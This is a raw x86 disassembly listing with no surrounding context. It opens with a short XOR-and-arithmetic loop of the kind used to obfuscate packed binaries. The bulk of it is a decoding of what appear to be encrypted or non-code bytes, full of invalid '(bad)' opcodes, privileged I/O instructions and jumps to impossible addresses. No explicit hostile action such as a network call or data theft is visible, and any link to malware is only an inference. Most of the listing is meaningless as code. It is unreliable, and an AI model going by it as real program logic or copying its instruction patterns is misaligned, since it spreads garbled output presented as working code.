  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0xe5557a6a
  4125d0:	out    0xbc,eax
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	sub    esi,esp
  4125dc:	fld    QWORD PTR [edi+ebx*2+0x4e529929]
  4125e3:	adc    al,0x38
  4125e5:	gs inc edi
  4125e7:	xchg   edi,eax
  4125e8:	pop    ebx
  4125e9:	add    DWORD PTR [ecx+esi*2],ecx
  4125ec:	pop    edx
  4125ed:	shl    DWORD PTR [ebx],1
  4125ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f0:	cli    
  4125f1:	ds xor al,ch
  4125f4:	daa    
  4125f5:	dec    ecx
  4125f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f7:	xlat   BYTE PTR ds:[ebx]
  4125f8:	dec    esi
  4125f9:	daa    
  4125fa:	jp     0x4125e9
  4125fc:	ret    
  4125fd:	mov    gs,WORD PTR [edi+edx*1+0x32]
  412601:	pop    edi
  412602:	ja     0x412646
  412604:	jne    0x412639
  412606:	jbe    0x412669
  412608:	and    bh,bl
  41260a:	cmp    eax,0xc24e9d7f
  41260f:	pop    ecx
  412610:	cdq    
  412611:	stc    
  412612:	jmp    DWORD PTR [esi+0x50811bb0]
  412618:	or     eax,0xa1c77667
  41261d:	shl    DWORD PTR [esi-0x1a],cl
  412620:	mov    edi,0xd877217a
  412625:	repz push ss
  412627:	cld    
  412628:	popf   
  412629:	icebp  
  41262a:	test   DWORD PTR [ebx],ebp
  41262c:	pop    es
  41262d:	sar    ebp,1
  41262f:	cmp    ecx,DWORD PTR ds:[edi-0x339c5126]
  412636:	fst    QWORD PTR [ecx+0x12b0a189]
  41263c:	mov    bh,0x77
  41263e:	pop    esp
  41263f:	leave  
  412640:	sar    BYTE PTR [edi-0x2539c87f],1
  412646:	xchg   esi,eax
  412647:	call   0xb324e811
  41264c:	arpl   dx,ax
  41264e:	mov    ebx,0x8e464ea4
  412653:	stos   DWORD PTR es:[edi],eax
  412654:	(bad)  
  412655:	mov    ebp,edi
  412657:	out    dx,al
  412658:	mov    ds:0x21f1a46a,eax
  41265d:	or     cl,bh
  41265f:	hlt    
  412660:	fidivr WORD PTR [esi+0x18]
  412663:	jbe    0x412621
  412665:	nop
  412666:	popf   
  412667:	mov    edi,0xfbf1248e
  41266c:	in     al,dx
  41266d:	xor    BYTE PTR [edx],bl
  41266f:	hlt    
  412670:	sbb    DWORD PTR [ebp-0x61],edx
  412673:	jge    0x4125f6
  412675:	sub    BYTE PTR [esp+esi*2],al
  412678:	(bad)  
  412679:	in     eax,dx
  41267a:	push   esp
  41267b:	adc    ebx,DWORD PTR [edx+eiz*1+0x607009fd]
  412682:	pop    eax
  412683:	data16 fiadd WORD PTR [edx+eiz*8+0x12]
  412688:	iret   
  412689:	push   0xa2b8ddec
  41268e:	and    eax,0xd163b290
  412693:	add    DWORD PTR [ecx+0x2a],edx
  412696:	shl    DWORD PTR ds:0x845cdc88,cl
  41269c:	push   es
  41269d:	cdq    
  41269e:	cdq    
  41269f:	pusha  
  4126a0:	cmc    
  4126a1:	inc    edx
  4126a2:	sub    edx,DWORD PTR [edx-0x12]
  4126a5:	idiv   DWORD PTR [ecx+0x43]
  4126a8:	sbb    BYTE PTR [si],0x58
  4126ac:	or     dl,ch
  4126ae:	inc    edi
  4126af:	mov    DWORD PTR [ecx],edx
  4126b1:	jns    0x4126c8
  4126b3:	xchg   esi,eax
  4126b4:	jle    0x41269d
  4126b6:	sub    ebp,esp
  4126b8:	mov    BYTE PTR [eax-0x25c23e5a],bl
  4126be:	and    BYTE PTR [esi-0x39f62785],ah
  4126c4:	cli    
  4126c5:	cmp    DWORD PTR [esi],esi
  4126c7:	xchg   esp,eax
  4126c8:	or     eax,0x752d2c28
  4126cd:	lea    esp,[edi-0x203108e2]
  4126d3:	adc    eax,DWORD PTR [edx-0x145cfd5]
  4126d9:	or     eax,DWORD PTR [edi-0x22e4118e]
  4126df:	xchg   edi,eax
  4126e0:	ret    
  4126e1:	hlt    
  4126e2:	jl     0x4126f7
  4126e4:	or     DWORD PTR [edx],esi
  4126e6:	pop    ebx
  4126e8:	mov    ch,0x3b
  4126ea:	ins    BYTE PTR es:[edi],dx
  4126eb:	xchg   esp,eax
  4126ec:	mov    bh,0xdd
  4126ee:	hlt    
  4126ef:	adc    DWORD PTR gs:[edi+0x18c949bc],ecx
  4126f6:	cmp    ebx,DWORD PTR [ecx-0x494bbcea]
  4126fc:	ins    BYTE PTR es:[edi],dx
  4126fd:	popa   
  4126fe:	aas    
  4126ff:	push   0x93d5c2d0
  412704:	or     al,0x8f
  412706:	fild   WORD PTR [edx-0x6fdfd6a4]
  41270c:	gs cli 
  41270e:	dec    esi
  41270f:	stos   BYTE PTR es:[edi],al
  412710:	inc    eax
  412711:	call   0xe9acd163
  412716:	xchg   esi,eax
  412717:	cs inc edi
  412719:	mov    ah,0x32
  41271b:	int3   
  41271c:	mov    dh,dl
  41271e:	push   0xffffffc5
  412720:	sub    ah,BYTE PTR [ecx+ebx*8-0x22c8390f]
  412727:	and    bh,BYTE PTR [eax-0x4a]
  41272a:	es jle 0x412792
  41272d:	and    eax,0xd6ce25e1
  412732:	mov    ebp,0xe2c8a617
  412737:	shl    DWORD PTR [ebp+0x3ce91b20],1
  41273d:	ret    
  41273e:	loope  0x412759
  412740:	xchg   esi,eax
  412741:	(bad)
  412745:	ds sub al,0x88
  412748:	addr16 mov eax,ds:0x5ded
  41274c:	mov    cl,0x49
  41274e:	js     0x412718
  412750:	hlt    
  412751:	dec    ebx
  412752:	(bad)  
  412753:	in     al,dx
  412754:	cmc    
  412755:	jge    0x41272f
  412757:	out    0xc9,eax
  412759:	dec    esi
  41275a:	xchg   ebp,eax
  41275b:	jns    0x4127c3
  41275d:	shl    BYTE PTR [ebx],1
  41275f:	call   0xe91d76bc
  412764:	je     0x4127bc
  412766:	dec    ebp
  412767:	mov    dh,BYTE PTR [ebx-0x60e6a9b]
  41276d:	clc    
  41276e:	pushf  
  41276f:	add    eax,0x67090330
  412774:	lea    edx,[ebp+0x71]
  412777:	sbb    edi,esp
  412779:	xor    dl,BYTE PTR [edi]
  41277b:	xchg   ebp,eax
  41277c:	mov    ah,0xc4
  41277e:	lods   eax,DWORD PTR ds:[esi]
  41277f:	test   BYTE PTR [ebx],dl
  412781:	nop
  412782:	ss stc 
  412784:	aad    0xdf
  412786:	lea    esp,[esi+ebp*2]
  412789:	arpl   WORD PTR [edi],di
  41278b:	add    al,bl
  41278d:	mov    bl,0xed
  41278f:	sbb    esp,DWORD PTR es:[ebx-0x1edaa470]
  412796:	mov    edx,DWORD PTR [edi-0x2c508bb]
  41279c:	test   eax,0xdd403409
  4127a1:	stos   BYTE PTR es:[edi],al
  4127a2:	cmp    edi,DWORD PTR ds:0xbb1b3972
  4127a8:	push   esp
  4127a9:	mov    dl,0x70
  4127ab:	and    DWORD PTR [ebx-0x64],esi
  4127ae:	lods   eax,DWORD PTR ds:[esi]
  4127af:	sahf   
  4127b0:	bound  edi,QWORD PTR [ebx+esi*2-0x80]
  4127b4:	ret    0xad64
  4127b7:	je     0x41279f
  4127b9:	stos   DWORD PTR es:[edi],eax
  4127ba:	mov    cl,0x8f
  4127bc:	pop    ebx
  4127bd:	out    0x1c,al
  4127bf:	xlat   BYTE PTR ds:[ebx]
  4127c0:	cvtpi2ps xmm4,QWORD PTR [ebx]
  4127c3:	mov    cl,0x73
  4127c5:	add    dl,ah
  4127c7:	jne    0x4127f6
  4127c9:	xor    eax,0x336c5537
  4127ce:	sbb    DWORD PTR cs:[edx+0x5f08ca06],ebp
  4127d5:	jnp    0x412782
  4127d7:	fs std 
  4127d9:	adc    al,0x60
  4127db:	cli    
  4127dc:	ins    BYTE PTR es:[edi],dx
  4127dd:	pop    ebp
  4127de:	push   ebp
  4127df:	(bad)  
  4127e1:	xchg   esi,eax
  4127e2:	scas   al,BYTE PTR es:[edi]
  4127e3:	mov    edi,0xaab57bed
  4127e8:	mov    BYTE PTR [ebp-0x291b64b4],bl
  4127ee:	sub    DWORD PTR [edi],0x56
  4127f1:	mov    ah,0xaa
  4127f3:	lock std 
  4127f5:	lock ins DWORD PTR es:[edi],dx
  4127f7:	or     eax,0x1396d861
  4127fc:	hlt    
  4127fd:	lahf   
  4127fe:	fistp  WORD PTR [edx-0x72782a0d]
  412804:	(bad)  
  412805:	push   0xf9d35bee
  41280a:	mov    bl,0x75
  41280c:	add    ebx,eax
  41280e:	sub    eax,0x8b4c747a
  412813:	and    eax,0xedc9ebb0
  412818:	add    eax,DWORD PTR [esi+0x7a]
  41281b:	jbe    0x41286a
  41281d:	cmc    
  41281e:	push   0x50
  412820:	(bad)  
  412822:	sub    dh,bl
  412824:	lods   al,BYTE PTR ds:[esi]
  412825:	pop    ss
  412826:	inc    esi
  412827:	into   
  412828:	or     DWORD PTR [eax-0x251f8bdb],esp
  41282e:	adc    DWORD PTR [esi-0x21d55071],ecx
  412834:	dec    esp
  412835:	loop   0x4127f4
  412837:	in     eax,0xbe
  412839:	pop    ds
  41283a:	push   ebp
  41283b:	xor    BYTE PTR [edx+0x705df821],0x65
  412842:	test   al,0xcd
  412844:	cmp    DWORD PTR cs:0x84ee0e25,ebx
  41284b:	mov    ah,0xfa
  41284d:	dec    eax
  41284e:	or     bh,bl
  412850:	sbb    eax,0xc01ab569
  412855:	pop    ebp
  412856:	aaa    
  412857:	pop    ebp
  412858:	sbb    BYTE PTR [esi],dl
  41285a:	jl     0x41288c
  41285c:	cmp    edx,edx
  41285e:	int3   
  41285f:	lahf   
  412860:	push   es
  412861:	jl     0x41286b
  412863:	inc    esi
  412864:	into   
  412865:	in     al,0x7
  412867:	lods   eax,DWORD PTR ds:[esi]
  412868:	daa    
  412869:	fbstp  TBYTE PTR [edi]
  41286b:	mov    bl,0xe5
  41286d:	in     al,dx
  41286e:	xor    al,bl
  412870:	or     bl,BYTE PTR [eax]
  412872:	rcr    DWORD PTR [eax],1
  412874:	mov    edx,0x1a1d7c99
  412879:	sbb    BYTE PTR [edx-0x64],dh
  41287c:	jl     0x41286c
  41287e:	sub    ch,BYTE PTR ds:0x78e9e3
  412884:	mov    eax,ds:0x119a2a55
  412889:	mov    ebx,0x5dfa8ea4
  41288e:	add    BYTE PTR [edx],dl
  412890:	std    
  412891:	cld    
  412892:	and    esp,ecx
  412894:	sbb    DWORD PTR [ebx-0xe],0x77dda367
  41289b:	push   edi
  41289c:	jbe    0x412842
  41289e:	outs   dx,BYTE PTR ds:[esi]
  41289f:	scas   al,BYTE PTR es:[edi]
  4128a0:	jecxz  0x4128b3
  4128a2:	cmp    bl,BYTE PTR [ecx+eiz*2]
  4128a5:	adc    dh,BYTE PTR [edi]
  4128a7:	mov    ah,0x85
  4128a9:	mov    bh,0x4f
  4128ab:	cmp    BYTE PTR [ebx],ah
  4128ad:	xchg   ebp,eax
  4128ae:	fcmovnbe st,st(4)
  4128b0:	add    DWORD PTR [edx+0x212f6c89],ebx
  4128b6:	ja     0x41289d
  4128b8:	pop    ebx
  4128b9:	ret    0xd30e
  4128bc:	sub    DWORD PTR [ebp+0x52f2ec51],esp
  4128c2:	push   ebp
  4128c3:	mov    cs,WORD PTR [edi]
  4128c5:	and    eax,0x6b27969e
  4128ca:	(bad)  
  4128cb:	das    
  4128cc:	dec    ebx
  4128cd:	mov    es,WORD PTR [edx-0x71a2b7ec]
  4128d3:	xor    eax,0x60703508
  4128d8:	adc    esp,DWORD PTR [ebp-0x5cac7fac]
  4128de:	jge    0x4128d6
  4128e0:	pop    edx
  4128e1:	mov    esp,0xe382a801
  4128e6:	inc    edx
  4128e7:	daa    
  4128e8:	out    0xdd,eax
  4128ea:	sbb    dh,ch
  4128ec:	sub    BYTE PTR [esi-0x36b30ded],dh
  4128f2:	add    BYTE PTR [esi-0x62],bh
  4128f5:	mov    ds:0xdf8a773,eax
  4128fa:	es mov ah,0xf8
  4128fd:	clc    
  4128fe:	dec    ebp
  4128ff:	pop    ebp
  412900:	xor    al,0x67
  412902:	push   ebx
  412903:	or     eax,0x9c2894c8
  412908:	pop    eax
  412909:	inc    edi
  41290a:	test   DWORD PTR [eax+ebx*4],ecx
  41290d:	call   0x42c4a2c5
  412912:	sub    BYTE PTR [esi+0x39e05a02],ch
  412918:	adc    DWORD PTR [esi+0x35],edi
  41291b:	rcl    DWORD PTR [ecx],1
  41291d:	in     al,0x5e
  41291f:	sti    
  412920:	(bad)  
  412921:	es es into 
  412924:	popf   
  412925:	push   edi
  412926:	xor    ecx,DWORD PTR [ecx-0x5339c443]
  41292c:	scas   eax,DWORD PTR es:[edi]
  41292d:	mov    bl,0x68
  41292f:	dec    esp
  412930:	push   ebx
  412931:	popf   
  412932:	stos   DWORD PTR es:[edi],eax
  412933:	int    0xed
  412935:	popf   
  412936:	xchg   ebx,eax
  412937:	push   ebx
  412938:	ins    DWORD PTR es:[edi],dx
  412939:	outs   dx,DWORD PTR ds:[esi]
  41293a:	in     al,dx
  41293b:	(bad)  
  41293c:	fld    DWORD PTR [esi+0xb]
  41293f:	neg    DWORD PTR [ebp+ebp*8+0x16dd47a3]
  412946:	je     0x412970
  412948:	pop    edx
  412949:	xor    BYTE PTR [ebx],ch
  41294b:	mov    ds:0x92276fb9,eax
  412950:	fdivr  QWORD PTR [eax+0x362b4bdf]
  412956:	and    bh,al
  412958:	cs call 0x38017780
  41295e:	(bad)  
  41295f:	and    ah,BYTE PTR [ebx+0x46]
  412962:	aaa    
  412963:	stos   BYTE PTR es:[edi],al
  412964:	in     al,dx
  412965:	mov    ebx,DWORD PTR [ebp-0x78f024f4]
  41296b:	repnz loopne 0x412924
  41296e:	or     esi,DWORD PTR [ecx-0x40]
  412971:	mov    BYTE PTR [edi],cl
  412973:	and    BYTE PTR [ebp-0x3d],0x85
  412977:	add    DWORD PTR [ecx+0xabe236a],0xc771d3dd
  412981:	pop    edi
  412982:	sbb    edi,edx
  412984:	xlat   BYTE PTR ds:[ebx]
  412985:	(bad)  
  412987:	hlt    
  412988:	pop    DWORD PTR [edx+0x48d44280]
  41298e:	fsub   QWORD PTR [esi+0x54]
  412991:	popf   
  412992:	dec    ebp
  412993:	popa   
  412994:	bound  si,DWORD PTR ds:0x4f56ce5
  41299b:	sub    DWORD PTR [edi],edx
  41299d:	cwde   
  41299e:	inc    edx
  41299f:	inc    esp
  4129a0:	dec    ebp
  4129a1:	and    dl,BYTE PTR [eax-0x4]
  4129a4:	pop    edi
  4129a5:	test   ecx,ebx
  4129a7:	arpl   WORD PTR [esi],di
  4129a9:	mov    edx,0xa511a30a
  4129ae:	addr16 mov ds:0x965f,al
  4129b2:	sahf   
  4129b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129b4:	mov    DWORD PTR [ebx-0x1e0aef16],edi
  4129ba:	push   edx
  4129bb:	or     cl,BYTE PTR [eax+0x4e]
  4129be:	mov    eax,ds:0x95f5e34c
  4129c3:	xor    bh,BYTE PTR [ebx]
  4129c5:	ret    0xe38f
  4129c8:	adc    DWORD PTR [esi],ebp
  4129ca:	or     eax,0x90a0145
  4129cf:	aad    0x4c
  4129d1:	test   al,0x1c
  4129d3:	out    dx,eax
  4129d4:	test   al,0x95
  4129d6:	mov    dh,0xb0
  4129d8:	loopne 0x4129a0
  4129da:	leave  
  4129db:	les    edi,FWORD PTR [ebx+edi*1+0xa68b0aa]
  4129e2:	pop    eax
  4129e3:	or     eax,0x3774758c
  4129e8:	xor    eax,0xc6ea8155
  4129ed:	xor    DWORD PTR [ebx],eax
  4129ef:	ret    
  4129f0:	lds    edi,FWORD PTR [edi-0x63cf485c]
  4129f6:	dec    ebx
  4129f7:	das    
  4129f8:	xchg   edi,eax
  4129f9:	fimul  WORD PTR [edx]
  4129fb:	pop    eax
  4129fc:	mov    ds:0x3faf845e,eax
  412a01:	push   esi
  412a02:	and    al,0xa5
  412a04:	pop    ebp
  412a05:	lods   eax,DWORD PTR ds:[esi]
  412a06:	adc    edx,DWORD PTR [ecx-0x1e]
  412a09:	pop    ebp
  412a0a:	mov    ebp,0xb8503c79
  412a0f:	fs call 0x11a0a9b3
  412a15:	cmp    DWORD PTR [eax],esp
  412a17:	xor    DWORD PTR [ebp-0x43],esp
  412a1a:	sub    eax,DWORD PTR [edi]
  412a1c:	retf   
  412a1d:	xchg   edx,eax
  412a1e:	sbb    al,0x63
  412a20:	or     BYTE PTR [ebx+0x36],cl
  412a23:	or     ah,dh
  412a25:	inc    ebx
  412a26:	loopne 0x4129ee
  412a28:	xchg   ebp,eax
  412a29:	mov    al,0x54
  412a2b:	sbb    ecx,edi
  412a2d:	adc    al,0xd
  412a2f:	das    
  412a30:	jb     0x412a1d
  412a32:	imul   ebx,DWORD PTR [ecx+0x75],0x6d
  412a36:	and    DWORD PTR [edx+eax*1-0x64353952],ecx
  412a3d:	dec    esp
  412a3e:	std    
  412a3f:	cmp    ebx,DWORD PTR [ebx+ecx*4+0x6f]
  412a43:	test   BYTE PTR [ebx+0x21bff2ee],dh
  412a49:	dec    edi
  412a4a:	mov    ecx,fs
  412a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a4d:	fnsave [edx]
  412a4f:	xchg   ebx,eax
  412a50:	popf   
  412a51:	cmp    al,dl
  412a53:	xor    eax,0xdbd1b9cd
  412a58:	adc    DWORD PTR [ebp-0x76],esp
  412a5b:	in     al,0x55
  412a5d:	or     DWORD PTR [ecx-0x48],0xffffffd4
  412a61:	adc    ebp,ebp
  412a63:	repnz lea esi,[eax+0xfef300a]
  412a6a:	xor    BYTE PTR [ecx-0x48bc361e],dl
  412a70:	cld    
  412a71:	ror    eax,1
  412a73:	jno    0x412aba
  412a75:	ins    DWORD PTR es:[edi],dx
  412a76:	loopne 0x412a56
  412a78:	push   ds
  412a79:	fisttp WORD PTR [edi]
  412a7b:	xor    al,0xd1
  412a7d:	cmp    DWORD PTR [esi+eax*1-0x3],esp
  412a81:	ins    BYTE PTR es:[edi],dx
  412a82:	push   ebp
  412a83:	and    DWORD PTR [esi+0x650cc299],0x41e33d40
  412a8d:	pop    ss
  412a8e:	mov    edx,0xad4e592d
  412a93:	jmp    0x412a1c
  412a95:	dec    eax
  412a96:	cmp    bl,0xc7
  412a99:	dec    ebx
  412a9a:	call   0x9697:0x96aa0f69
  412aa1:	jmp    0x5f9830ac
  412aa6:	or     bh,BYTE PTR [edx+0x5116c0f5]
  412aac:	inc    ebp
  412aad:	pop    edx
  412aae:	mov    al,0xa2
  412ab0:	loopne 0x412a87
  412ab2:	mov    ds:0xa092797a,eax
  412ab7:	add    ecx,ebp
  412ab9:	lods   eax,DWORD PTR ds:[esi]
  412aba:	in     eax,0xa9
  412abc:	xchg   DWORD PTR [esi],ebx
  412abe:	cli    
  412abf:	xor    BYTE PTR [edi],bh
  412ac1:	jmp    0x412ad3
  412ac3:	imul   DWORD PTR [ecx-0x4f670966]
  412ac9:	idiv   ebx
  412acb:	sub    eax,0xf0e77590
  412ad0:	sub    DWORD PTR [edx+0x78],ebp
  412ad3:	sti    
  412ad4:	jne    0x412b4d
  412ad6:	(bad)  
  412ad7:	lahf   
  412ad8:	mov    cl,BYTE PTR [edi+0x35f7a7cd]
  412ade:	dec    ecx
  412adf:	leave  
  412ae0:	pop    edx
  412ae1:	inc    edx
  412ae2:	xchg   DWORD PTR [edi-0xd],ebp
  412ae5:	add    edi,DWORD PTR [ebp+edi*2-0x40b5abdb]
  412aec:	xchg   edx,eax
  412aed:	mov    ebx,0x5ab53e12
  412af2:	adc    eax,0x87e7f680
  412af7:	repz cmc 
  412af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412afa:	in     eax,0xf8
  412afc:	test   al,0x5
  412afe:	sbb    ecx,DWORD PTR [edx+eiz*4-0x5]
  412b02:	(bad)  
  412b03:	rcl    BYTE PTR ds:0x95abdfa5,0xe4
  412b0a:	mov    ?,WORD PTR [ebx-0x71]
  412b0d:	shl    BYTE PTR [esi+0x49a503ee],1
  412b13:	shl    DWORD PTR [eax-0x32a53dca],1
  412b19:	rcr    BYTE PTR [ebx+0x48b087d4],1
  412b1f:	bnd jl 0x412ae5
  412b22:	mov    ah,0x6a
  412b24:	jbe    0x412aed
  412b26:	sub    eax,0xe9abf5a
  412b2b:	jg     0x412b76
  412b2d:	rcl    BYTE PTR ds:0x1d5361d,0x7f
  412b34:	iret   
  412b35:	pop    esi
  412b36:	out    dx,eax
  412b37:	test   DWORD PTR [eax-0x4d],esi
  412b3a:	shr    BYTE PTR [edx+0x85d8f36],cl
  412b40:	(bad)  
  412b42:	or     bl,BYTE PTR [edi+0x1]
  412b45:	xchg   ebx,eax
  412b46:	into   
  412b47:	ret    0x5b25
  412b4a:	call   0x9e04:0x81dcef21
  412b51:	xchg   esi,eax
  412b52:	fcomp  st(2)
  412b54:	jmp    0xe7a08b04
  412b59:	dec    esp
  412b5a:	out    0xdd,eax
  412b5c:	dec    edi
  412b5d:	cmp    eax,0x2e9b843a
  412b62:	or     DWORD PTR [ebx],esi
  412b64:	adc    BYTE PTR [esi],dl
  412b66:	loope  0x412b0d
  412b68:	nop
  412b69:	repz cmc 
  412b6b:	and    DWORD PTR [ebx],esp
  412b6d:	sub    dh,0xa2
  412b70:	(bad)  
  412b71:	jbe    0x412be8
  412b73:	sti    
  412b74:	mov    ?,WORD PTR [eax-0x2b]
  412b77:	cmp    bh,BYTE PTR [esi+ebx*2+0x5298ed98]
  412b7e:	(bad)  
  412b7f:	into   
  412b80:	xchg   edi,eax
  412b81:	push   0x59703ae0
  412b86:	cdq    
  412b87:	imul   edi,DWORD PTR [edx-0x53],0x5d
  412b8b:	fild   DWORD PTR [ecx+0x22b35d69]
  412b91:	enter  0x4783,0x1c
  412b95:	xchg   ebx,eax
  412b96:	faddp  st(0),st
  412b98:	imul   edi,DWORD PTR [edx-0x4d0782c4],0x30b90c1b
  412ba2:	ret    0xae05
  412ba5:	call   0xe5d3:0x2f26dbb5
  412bac:	adc    al,BYTE PTR [esp+esi*1-0x3763c11f]
  412bb3:	js     0x412b99
  412bb5:	dec    esi
  412bb6:	ins    DWORD PTR es:[edi],dx
  412bb7:	mov    ecx,0xa0ca56e
  412bbc:	pop    ebp
  412bbd:	sbb    eax,0x48486e5a
  412bc2:	adc    ch,dh
  412bc4:	std    
  412bc5:	cmp    dh,BYTE PTR [esi-0x2dc90c4f]
  412bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bcc:	pop    edi
  412bcd:	retf   0x6d19
  412bd0:	inc    ebx
  412bd1:	popa   
  412bd2:	aad    0xe8
  412bd4:	neg    dh
  412bd6:	inc    edx
  412bd7:	daa    
  412bd8:	icebp  
  412bd9:	and    eax,esp
  412bdb:	fstp   TBYTE PTR [eax-0x1a8e16fa]
  412be1:	test   DWORD PTR [ebx-0x79],ebp
  412be4:	sub    ah,dh
  412be6:	fisttp DWORD PTR [edx]
  412be8:	pop    edi
  412be9:	fsubr  DWORD PTR [ecx-0x10]
  412bec:	js     0x412c58
  412bee:	jo     0x412c33
  412bf0:	fdivrp st(4),st
  412bf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412bf3:	dec    edi
  412bf4:	arpl   dx,cx
  412bf6:	and    BYTE PTR [edi+0x1f],bl
  412bf9:	jae    0x412c79
  412bfb:	es add al,0x13
  412bfe:	test   DWORD PTR [edx+ecx*8-0x6558134b],edi
  412c05:	(bad)  
  412c06:	xchg   ebx,eax
  412c07:	(bad)  
  412c08:	cmp    DWORD PTR [eax+0x35],ebp
  412c0b:	pop    edi
  412c0c:	pop    ebp
  412c0d:	fwait
  412c0e:	sub    eax,0x4c5534c
  412c13:	mov    WORD PTR [esp+ebp*8+0x30],gs
  412c17:	sub    al,0x1e
  412c19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c1a:	lahf   
  412c1b:	sub    edi,DWORD PTR [edx-0x59f63217]
  412c21:	enter  0xf299,0x32
  412c25:	pop    es
  412c26:	stos   BYTE PTR es:[edi],al
  412c27:	or     ebp,DWORD PTR [ecx+0x42]
  412c2a:	shl    DWORD PTR es:0x432411ac,0x27
  412c32:	lea    ebp,[esp+eiz*4+0x1a]
  412c36:	sbb    DWORD PTR [esi-0x45221451],ebp
  412c3c:	and    BYTE PTR [esi-0x2f],0x57
  412c40:	push   esi
  412c41:	dec    esi
  412c42:	(bad)
  412c46:	mov    fs,eax
  412c48:	add    al,BYTE PTR [eax-0x26]
  412c4b:	loope  0x412c7c
  412c4d:	sbb    eax,0x42db2429
  412c52:	pop    ebx
  412c53:	clc    
  412c54:	mov    esi,DWORD PTR [esi]
  412c56:	dec    ebp
  412c57:	(bad)  
  412c58:	imul   edx,DWORD PTR [eax+0x9],0xc35280a8
  412c5f:	imul   ebx,DWORD PTR [edx+0x55],0x17eba559
  412c66:	repz cmp dl,cl
  412c69:	push   edx
  412c6a:	xor    ebx,DWORD PTR [ecx-0x31dfe17d]
  412c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c71:	jne    0x412ccf
  412c73:	push   0x74525ae9
  412c78:	loopne 0x412c4a
  412c7a:	sbb    al,0x67
  412c7c:	test   al,0x76
  412c7e:	jne    0x412c30
  412c80:	or     BYTE PTR [edi+0x6577671d],ch
  412c86:	inc    ebp
  412c87:	sbb    al,0xc3
  412c89:	jmp    0x90e2:0xbe9ef646
  412c90:	mov    edi,DWORD PTR [ecx+0x32]
  412c93:	dec    ebp
  412c94:	pop    eax
  412c95:	stos   BYTE PTR es:[edi],al
  412c96:	mov    ebx,0x8f8f1a26
  412c9b:	rol    BYTE PTR [edi+0x4a],cl
  412c9e:	hlt    
  412c9f:	test   BYTE PTR [eax+ebp*2],al
  412ca2:	(bad)
  412ca6:	push   es
  412ca7:	lea    ebp,[esi]
  412ca9:	sets   BYTE PTR [ecx-0x36]
  412cad:	or     bh,bh
  412caf:	(bad)  
  412cb0:	mov    esp,0x9e76d781
  412cb5:	mov    ch,0x95
  412cb7:	stos   DWORD PTR es:[edi],eax
  412cb8:	and    eax,0xfb3f8181
  412cbd:	cmc    
  412cbe:	jbe    0x412d21
  412cc0:	psubusb mm5,QWORD PTR [edi]
  412cc3:	clc    
  412cc4:	sbb    ch,BYTE PTR [edx-0x1073588c]
  412cca:	mov    ebx,0xadffc87d
  412ccf:	adc    DWORD PTR [edx+0x1b25e3d7],0x8c716674
  412cd9:	push   ebp
  412cda:	pop    edi
  412cdb:	inc    ecx
  412cdc:	pop    ebx
  412cdd:	into   
  412cde:	mov    bh,0x63
  412ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce1:	(bad)  [ebx]
  412ce3:	mov    DWORD PTR [edx+edx*8],edx
  412ce6:	and    eax,0xbd580264
  412ceb:	push   es
  412cec:	stos   BYTE PTR es:[edi],al
  412ced:	mov    cl,0x8
  412cef:	(bad)  
  412cf0:	cmp    DWORD PTR [ecx-0x3b],ebx
  412cf3:	xor    al,0x3c
  412cf5:	push   edx
